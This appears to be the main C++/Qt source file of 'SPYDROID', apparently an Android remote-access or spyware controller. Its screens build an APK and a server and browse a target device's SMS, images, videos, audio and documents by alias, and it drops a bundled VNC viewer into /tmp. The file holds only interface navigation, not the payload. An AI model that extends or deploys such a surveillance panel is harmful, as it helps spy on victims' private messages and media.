/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include <QApplication>
#include <QFile>
#include <QPointer>
#include <QStackedWidget>
#include <QMessageBox>
#include <QDebug>
#include <fstream>
#include <unistd.h> 
#include "../../../../include/vnc_viewer.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/HomeScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/DashBoardScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/ApkStudioScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/ServerStudioScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/SmsScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/MultimediaScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/ImagesScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/VideosScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/AudiosScreen.h"
#include "../../../../core-ui/src/spydroid/ui/presentation/DocumentsScreen.h"

// Widget index
enum ScreenIndex {
    HomeScreenIndex = 0,
    DashBoardScreenIndex,
    BuildApkScreenIndex,
    BuildServerScreenIndex,
    GenerateApkScreenIndex,
    MultimediaScreenIndex,
    SmsScreenIndex,
    ImagesScreenIndex,
    VideosScreenIndex,
    AudiosScreenIndex,
    DocumentsScreenIndex
};

// Function to handle navigation
void navigateTo(QWidget* widget, QStackedWidget& stackedWidget, const QString& title) {
    if (widget) {
        stackedWidget.setCurrentWidget(widget);
        stackedWidget.setWindowTitle(title);
    } else {
        qWarning() << "Widget is null, cannot navigate.";
        QMessageBox::warning(nullptr, "Navigation Error", "Unable to navigate, target screen is not available.");
    }
}

int main(int argc, char *argv[]) {
    std::string filePath = "/tmp/vnc_viewer";

    // If the file doesn't exist, create it and set the permissions
    if (access(filePath.c_str(), F_OK) == -1) {
        std::ofstream outfile(filePath, std::ios::binary);
        outfile.write(reinterpret_cast<const char*>(vncviewer), vncviewer_len);
        outfile.close();

        // Change permissions using QFile
        QFile file(filePath.c_str());
        file.setPermissions(QFile::ExeOwner | QFile::ReadOwner | QFile::WriteOwner);
    }

    QApplication app(argc, argv);
    QStackedWidget stackedWidget;

    // Using QPointer to manage widget lifetime automatically
    QPointer<HomeScreen> homeScreen = new HomeScreen(&stackedWidget);
    QPointer<DashBoardScreen> dashBoardScreen = new DashBoardScreen(&stackedWidget);
    QPointer<ApkStudioScreen> apkStudioScreen = new ApkStudioScreen(&stackedWidget);
    QPointer<ServerStudioScreen> serverStudioScreen = new ServerStudioScreen(&stackedWidget);
    QPointer<SmsScreen> smsScreen = new SmsScreen(&stackedWidget);
    QPointer<MultimediaScreen> multimediaScreen = new MultimediaScreen(&stackedWidget);
    QPointer<ImagesScreen> imagesScreen = new ImagesScreen(&stackedWidget);
    QPointer<VideosScreen> videosScreen = new VideosScreen(&stackedWidget);
    QPointer<AudiosScreen> audiosScreen = new AudiosScreen(&stackedWidget);
    QPointer<DocumentsScreen> documentsScreen = new DocumentsScreen(&stackedWidget);

    // Add widgets to QStackedWidget
    stackedWidget.addWidget(homeScreen);            // Index 0
    stackedWidget.addWidget(dashBoardScreen);       // Index 1 
    stackedWidget.addWidget(apkStudioScreen);       // Index 2
    stackedWidget.addWidget(serverStudioScreen);    // Index 3
    stackedWidget.addWidget(multimediaScreen);      // Index 4
    stackedWidget.addWidget(smsScreen);             // Index 5
    stackedWidget.addWidget(imagesScreen);          // Index 6
    stackedWidget.addWidget(videosScreen);          // Index 7
    stackedWidget.addWidget(audiosScreen);          // Index 8
    stackedWidget.addWidget(documentsScreen);       // Index 9

    // Show the initial view
    stackedWidget.setCurrentIndex(HomeScreenIndex);
    stackedWidget.showMaximized();
    stackedWidget.setWindowTitle("SPYDROID");

    // Navigation connections (verify that the signals exist in the classes)
    QObject::connect(homeScreen, &HomeScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
        navigateTo(dashBoardScreen, stackedWidget, "Panel de control");
    });

    QObject::connect(homeScreen, &HomeScreen::goToBuildApk, [&stackedWidget, apkStudioScreen] () {
        navigateTo(apkStudioScreen, stackedWidget, "APK Estudio");
    });

    QObject::connect(homeScreen, &HomeScreen::goToBuildServer, [&stackedWidget, serverStudioScreen] () {
        navigateTo(serverStudioScreen, stackedWidget, "Servidor Estudio");
    });


    QObject::connect(dashBoardScreen, &DashBoardScreen::goToHome, [&stackedWidget, homeScreen]() {
        navigateTo(homeScreen, stackedWidget, "SPYDROID");
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
        if (multimediaScreen) {
            multimediaScreen->setAlias(alias);
            navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
        }
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToSms, [&stackedWidget, smsScreen](const QString& alias) {
        if (smsScreen) {
            smsScreen->setAlias(alias);
            navigateTo(smsScreen, stackedWidget, "Mensajes de texto de " + alias);
        } else {
            qWarning() << "SmsScreen is not available.";
        }
    });

    QObject::connect(smsScreen, &SmsScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
        navigateTo(dashBoardScreen, stackedWidget, "Panel de control");
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
        navigateTo(dashBoardScreen, stackedWidget, "Panel de control");
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToImages, [&stackedWidget, imagesScreen](const QString& alias) {
        if (imagesScreen) {
            imagesScreen->setAlias(alias);
            navigateTo(imagesScreen, stackedWidget, "Imagenes de " + alias);
        } else {
            qWarning() << "ImagesScreen is not available.";
        }
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToVideos, [&stackedWidget, videosScreen](const QString& alias) {
        if (videosScreen) {
            videosScreen->setAlias(alias);
            navigateTo(videosScreen, stackedWidget, "Videos de " + alias);
        } else {
            qWarning() << "VideosScreen is not available.";
        }
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToAudios, [&stackedWidget, audiosScreen](const QString& alias) {
        if (audiosScreen) {
            audiosScreen->setAlias(alias);
            navigateTo(audiosScreen, stackedWidget, "Audios de " + alias);
        } else {
            qWarning() << "AudiosScreen is not available.";
        }
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToDocuments, [&stackedWidget, documentsScreen](const QString& alias) {
        if (documentsScreen) {
            documentsScreen->setAlias(alias);
            navigateTo(documentsScreen, stackedWidget, "Documentos de " + alias);
        } else {
            qWarning() << "DocumentsScreen is not available.";
        }
    });

    QObject::connect(imagesScreen, &ImagesScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
    });

    QObject::connect(videosScreen, &VideosScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
    });

    QObject::connect(audiosScreen, &AudiosScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
    });

    QObject::connect(documentsScreen, &DocumentsScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
    });

    QObject::connect(apkStudioScreen, &ApkStudioScreen::goToHome, [&stackedWidget, homeScreen] () {
        navigateTo(homeScreen, stackedWidget, "Panel de control");
    });

    QObject::connect(serverStudioScreen, &ServerStudioScreen::goToHome, [&stackedWidget, homeScreen] () {
        navigateTo(homeScreen, stackedWidget, "Panel de control");
    });

    return app.exec();
}
